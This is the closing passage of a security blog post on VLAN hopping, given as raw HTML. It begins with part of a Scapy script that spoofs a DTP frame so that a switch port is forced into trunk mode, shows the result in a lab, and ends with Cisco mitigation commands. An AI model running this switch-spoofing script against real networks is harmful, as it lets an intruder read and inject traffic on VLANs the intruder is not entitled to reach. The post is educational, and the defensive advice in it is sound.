    <span class=n>pkt</span> <span class=o>=</span> <span class=n>sniff</span><span class=p>(</span><span class=n>count</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>iface</span><span class=o>=</span><span class=n>interface</span><span class=p>,</span> <span class=nb>filter</span><span class=o>=</span><span class=s2>&#34;ether dst 01:00:0c:cc:cc:cc&#34;</span><span class=p>)</span> 
    <span class=k>print</span><span class=p>(</span><span class=s2>&#34;[~] Found DTP packet&#34;</span><span class=p>)</span>

    <span class=c1>#Craft malicious packet</span>
    <span class=n>pkt</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>src</span><span class=o>=</span><span class=n>mac_addr</span> 
    <span class=n>pkt</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=n>DTP</span><span class=p>][</span><span class=n>DTPStatus</span><span class=p>]</span><span class=o>.</span><span class=n>status</span><span class=o>=</span><span class=s1>&#39;</span><span class=se>\x03</span><span class=s1>&#39;</span> 

    <span class=c1>#Trunk initialization </span>
    <span class=k>print</span><span class=p>(</span><span class=s2>&#34;[!] Intiating trunk...&#34;</span><span class=p>)</span>
    <span class=k>try</span><span class=p>:</span>
        <span class=n>sendp</span><span class=p>(</span><span class=n>pkt</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>loop</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>verbose</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>iface</span><span class=o>=</span><span class=n>interface</span><span class=p>)</span> 
        <span class=k>print</span><span class=p>(</span><span class=s2>&#34;[!] Trunk initiated&#34;</span><span class=p>)</span>
        <span class=n>trunk_init</span><span class=o>=</span><span class=bp>True</span>
    <span class=k>except</span><span class=p>:</span>
        <span class=k>print</span><span class=p>(</span><span class=s2>&#34;[!] Failed intiating trunk&#34;</span><span class=p>)</span>

</code></pre></div><p>This script is sniffing on a specified interface for a DTP frame, once it has sniffed it we can replace the MAC source address by ours, change the status to \x03 that sets it to desirable. Then send back the packet, right after we can see the link goes down and up after half a second.</p><p>Here is the execution of our script:<br><img loading=lazy src=/img/posts/vlan_hopping/result_script_trunk.png alt=result_script_trunk></p><p>We can now check the trunk status on the company switch:<br><img loading=lazy src=/img/posts/vlan_hopping/trunk_state_company_2.png alt=trunk_state_company_2></p><p>And we can see the link between the switch and our laptop is now trunk and not an access one. This means we can sniff the traffic coming from others VLANs and even craft our own packets with a specified VLAN tag. In order to verify what I&rsquo;ve just said let&rsquo;s just wait for an ARP request from PC2:<br><img loading=lazy src=/img/posts/vlan_hopping/arp_pc2.png alt=arp_pc2></p><p>And that&rsquo;s how we can confirm ou PoC (yes I&rsquo;m too lazy to craft my own tagged packets) ! Just for the fun I opened a web server on my attacker host and requested it from PC2, here it is:<br><img loading=lazy src=/img/posts/vlan_hopping/laptop_trunk_webserver.png alt=laptop_trunk></p><h2 id=mitigations>Mitigations<a hidden class=anchor aria-hidden=true href=#mitigations>#</a></h2><p>Okey, we&rsquo;ve been able to exploit VLAN Hopping, but now, how can we avoid getting hopped on our own network and limit the use of VLAN Hopping ? These are a few mitigations that can be applied to switches (I&rsquo;ll give the commands for Cisco switches but you can look for the equivalent for other systems).</p><h3 id=mitigate-double-tagging>Mitigate Double Tagging<a hidden class=anchor aria-hidden=true href=#mitigate-double-tagging>#</a></h3><p>Double tagging is quite hard to mitigate but you can still drastically limit it by:</p><ul><li>Changing native VLAN<ul><li><code>switchport trunk native vlan [vlan number]</code></li></ul></li><li>Deactivating any protocol that could give information about native VLAN (eg CDP for Cisco)<ul><li><code>no cdp run</code></li></ul></li><li>Force tagging of native VLAN<ul><li><code>vlan dot1q tag native</code></li></ul></li></ul><h3 id=mitigate-switch-spoofing>Mitigate Switch Spoofing<a hidden class=anchor aria-hidden=true href=#mitigate-switch-spoofing>#</a></h3><p>You can mitigate Switch Spoofing by:</p><ul><li>Deactivating DTP on every port<ul><li><code>switchport nonegotiate</code></li></ul></li><li>Always put ports that are not absolutely needed for a trunk in access mode<ul><li><code>switchport mode access</code></li></ul></li><li>Using the same reccomandations than the ones for Double Tagging</li></ul><h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2><p>In order to conclude this blogpost I would like first of all to thank you for reading until here, if ever you feel this article taught you anything, feel free to share it to friends and on any social network.</p><p>If ever you think there are some precisions/fixes that should be applied to this post hit me up on socials, Twitter <a href=https://twitter.com/bWlrYQ>here</a> or on Discord <code>\`#0001</code>.</p><p>What&rsquo;s more, big thanks to Flag&rsquo;Malo for offering me the possibility of giving my first ever talk !</p><p>And as I only taunted Cisco two times during this post I would like to do it for a third time :)
<img loading=lazy src=/img/posts/vlan_hopping/man_sweating_meme.jpg alt=man_sweating_meme></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bwlryq.net/tags/networking/>Networking</a></li><li><a href=https://bwlryq.net/tags/security/>Security</a></li><li><a href=https://bwlryq.net/tags/layer-2/>Layer 2</a></li><li><a href=https://bwlryq.net/tags/vlan/>VLAN</a></li><li><a href=https://bwlryq.net/tags/explotation/>Explotation</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Networking - VLAN Hopping on twitter" href="https://twitter.com/intent/tweet/?text=Networking%20-%20VLAN%20Hopping&url=https%3a%2f%2fbwlryq.net%2fposts%2fvlan_hopping%2f&hashtags=Networking%2cSecurity%2cLayer2%2cVLAN%2cExplotation"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zm-253.927 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Networking - VLAN Hopping on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fbwlryq.net%2fposts%2fvlan_hopping%2f&title=Networking%20-%20VLAN%20Hopping&summary=Networking%20-%20VLAN%20Hopping&source=https%3a%2f%2fbwlryq.net%2fposts%2fvlan_hopping%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0v-129.439c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02v-126.056c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768h75.024zm-307.552-334.556c-25.674.0-42.448 16.879-42.448 39.002.0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Networking - VLAN Hopping on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fbwlryq.net%2fposts%2fvlan_hopping%2f&title=Networking%20-%20VLAN%20Hopping"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zm-119.474 108.193c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zm-160.386-29.702c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Networking - VLAN Hopping on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbwlryq.net%2fposts%2fvlan_hopping%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978v-192.915h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Networking - VLAN Hopping on whatsapp" href="https://api.whatsapp.com/send?text=Networking%20-%20VLAN%20Hopping%20-%20https%3a%2f%2fbwlryq.net%2fposts%2fvlan_hopping%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23-13.314-11.876-22.304-26.542-24.916-31.026s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Networking - VLAN Hopping on telegram" href="https://telegram.me/share/url?text=Networking%20-%20VLAN%20Hopping&url=https%3a%2f%2fbwlryq.net%2fposts%2fvlan_hopping%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47A3.38 3.38.0 0126.49 29.86zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://bwlryq.net>bWlrYQ | Blog</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById('menu')
if(menu){menu.scrollLeft=localStorage.getItem("menu-scroll-position");menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft);}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.pushState(null,null,`#${id}`);}});});</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script><script>document.querySelectorAll('pre > code').forEach((codeblock)=>{const container=codeblock.parentNode.parentNode;const copybutton=document.createElement('button');copybutton.classList.add('copy-code');copybutton.innerHTML='copy';function copyingDone(){copybutton.innerHTML='copied!';setTimeout(()=>{copybutton.innerHTML='copy';},2000);}
copybutton.addEventListener('click',(cb)=>{if('clipboard'in navigator){navigator.clipboard.writeText(codeblock.textContent);copyingDone();return;}
const range=document.createRange();range.selectNodeContents(codeblock);const selection=window.getSelection();selection.removeAllRanges();selection.addRange(range);try{document.execCommand('copy');copyingDone();}catch(e){};selection.removeRange(range);});if(container.classList.contains("highlight")){container.appendChild(copybutton);}else if(container.parentNode.firstChild==container){}else if(codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"){codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);}else{codeblock.parentNode.appendChild(copybutton);}});</script></body></html>